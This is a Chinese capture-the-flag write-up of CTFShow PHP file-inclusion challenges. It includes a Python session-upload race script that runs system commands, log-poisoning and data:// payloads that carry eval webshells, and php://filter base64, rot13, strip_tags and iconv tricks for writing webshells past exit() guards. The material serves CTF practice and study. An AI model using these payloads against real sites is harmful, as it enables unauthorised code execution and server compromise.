---
title: CTFShow-文件包含
date: 2022-02-12 15:39:35
updated: 2022-02-12 15:39:35
tags: 文件包含
categories: CTFShow
toc: true
---

一些在CTFShow上有关文件包含的题目记录

<!-- more -->



基础知识详见：web基础漏洞

### web80-81

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

#### 法一：大小写绕过

![](https://s2.loli.net/2022/02/12/NrktI7eyaMLGd68.png)

#### 法二：日志文件包含

`?file=/var/log/nginx/access.log`，将要执行的代码放入user-agent里，可以是一句话木马，多发包几次

![](https://s2.loli.net/2022/02/12/e6bZiq8yu5jHJdh.png)

### web82-86

https://blog.csdn.net/weixin_45551083/article/details/110259089

通杀session竞争脚本

```python

# -*- coding: utf-8 -*-
# @author:lonmar
import io
import requests
import threading

sessID = 'flag'
url = 'http://7920d625-4983-43eb-9d4f-335e57303fd0.chall.ctf.show/'


def write(session):
    while event.isSet():
        f = io.BytesIO(b'a' * 1024 * 50)
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat *.php");?>'},
            files={'file': ('test.txt', f)}
        )


def read(session):
    while event.isSet():
        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))
        if 'test' in response.text:
            print(response.text)
            event.clear()
        else:
            print('[*]retrying...')


if __name__ == '__main__':
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()

```

### web87

参考大佬：

[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163)

[P神：谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

[探索php://filter在实战当中的奇技淫巧](https://www.anquanke.com/post/id/202510)

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
}else{
    highlight_file(__FILE__);
}
```

绕过退出代码

#### 1. **base64编码绕过**

原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；

```php
$file=php://filter/write=convert.base64-decode/resource=shell.php
$content=<?php  eval($_REQUEST[1])?>
        =aaPD9waHAgIGV2YWwoJF9SRVFVRVNUWzFdKT8+
    注意要将+号进行url编码,通过空格等方式让base64编码后没有=号
payload:
$file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2573%2568%2565%256c%256c%252e%2570%2568%2570
$content=abPD9waHAgIGV2YWwoJF9SRVFVRVNUWzFdKT8%2B
```

这里之所以将$content加了一个aa，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpdie参与了解码，所以补上两位就可以完全转化；

注意此题有urldecode，所以可以对file进行编码从而绕过之前的过滤

#### 2. **rot13 编码绕过**

`<?php exit; ?>`在经过rot13编码后会变成`<?cuc rkvg; ?>`，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：

```php
$file=php://filter/write=string.rot13/resource=shell.php
$content=<?cuc  riny($_ERDHRFG[1])?> //注意要到合适的加密网址，防止大小写变化
```

#### 3.strip_tags(php5有效)

我们观察一下，这个`<?php exit; ?>`实际上是什么？

实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。

```php
$file=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php
不过被弃用了
```

#### 4.组合使用

### web88

```php
<?php
$file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
```

可以发现`/ : ; ,`都没有过滤,使用data协议，记得构造编码后没有=和+（此题过滤了+)

`?file=data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h` ==> `<?php eval($_GET[1]);?>a`

### web117编码过滤器

```php
<?php
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

详情见上面参考链接

payload:

```
GET: ?file=php://filter/convert.iconv.ucs-2be.ucs-2le/resource=shell.php

POST: contents=?<hp pvela$(G_TE'['a)] ;>?
```

